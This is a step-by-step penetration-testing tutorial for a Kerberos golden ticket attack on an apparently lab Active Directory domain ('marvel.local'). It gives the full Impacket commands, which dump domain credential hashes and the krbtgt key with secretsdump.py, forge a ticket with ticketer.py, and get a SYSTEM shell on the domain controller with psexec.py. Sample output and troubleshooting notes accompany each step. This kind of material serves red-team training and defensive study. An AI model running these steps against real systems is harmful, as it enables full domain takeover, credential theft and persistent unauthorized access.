# Kerberos Golden Ticket Attack

## Dumping hashes from DC using Impacket secretsdump.py

If you have access to an account that is able to dump domain credentials, either due to being a domain admin or having excessive privileges, the following command can be used:

`sudo python secretsdump.py marvel.local/administrator:Password123\!@hydra-dc.marvel.local`

Where `marvel.local` is the domain `administrator:Password123\!` is the username and password of the user that has the privileges to dump the domain hashes and `hydra-dc.marvel.local` is the fully qualified domain name (FQDN) of the domain.

The output from the dump should look something like:

```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x56ab23a1c4f8bdc81875a194b1cecce5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3174e6ed5e2e8747ad5cc3fcfa73aab5:::

[...SNIP...]

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fe846f3874239696cdb0bb491b9dfc33eeebc727c67dbf2dee58e401e9ee754e
Administrator:aes128-cts-hmac-sha1-96:ffbcc24e1b5b9e6f20c23d2d6adec791
Administrator:des-cbc-md5:efe0bf683746c4df
krbtgt:aes256-cts-hmac-sha1-96:47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5
krbtgt:aes128-cts-hmac-sha1-96:c6fbe3420417a94ac4f9418e4b966f3d
krbtgt:des-cbc-md5:fe8f45195770e952
MARVEL.LOCAL\fcastle:aes256-cts-hmac-sha1-96:c95bf1bf87ec3dc738a676e4372d263480fea0ececc44fbab8e3343a5fab8cfe

```

The Kerberos NTLM hash or AES Keys can be used to create a golden ticket.  In the example below using `ticketer.py` the AES 256 key `47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5` was used.

## Create Golden Ticket using Impacket ticketer.py

`python ticketer.py -aesKey 47edef840303d581bca8b8c09f587363ca755a926984b49e4297cd6bfc74bce5 -domain-sid <Domain_SID_HERE> -domain <domain.name> <anyusernamehere>`

This will generate a <username>.ccache file in the current directory.  Move the <username>.ccache file to /tmp/<username.ccache>
  
Set the following variable within the bash terminal:

`export KRB5CCNAME='<username>.ccache'`

## Editing /etc/hosts File

Now you will need to add your domain details and IP address to your /etc/hosts file.  In my case my domain name is marvel.local and the Domain Controller is named hydra-dc.marvel.local and is at 10.0.2.15:

```
10.0.2.15   hydra-dc.marvel.local
10.0.2.15   marvel.local

```

## Impacket psexec.py

Once everything above has been set you will now be able to use Impackets psexec.py script to get a shell on the domain controller as NT AUTHORITY\SYSTEM using the following command:

`sudo python psexec.py -k -no-pass marvel.local/badman@hydra-dc.marvel.local`

The output should look like:

```
[+] Trying to connect to KDC at MARVEL.LOCAL
[+] Using Kerberos Cache: /tmp/badman.ccache
[+] SPN CIFS/HYDRA-DC.MARVEL.LOCAL@MARVEL.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/MARVEL.LOCAL@MARVEL.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at MARVEL.LOCAL
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>

```

Note that in the command above you MUST specify the fully qualified domain name for the domain controller `hydra-dc.marvel.local`.  If you only specify the IP address it will not work and show the error:

```
KerberosError: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Also the ticket must be generated and used within the 20 minute time-frame as described in the article here "https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html"
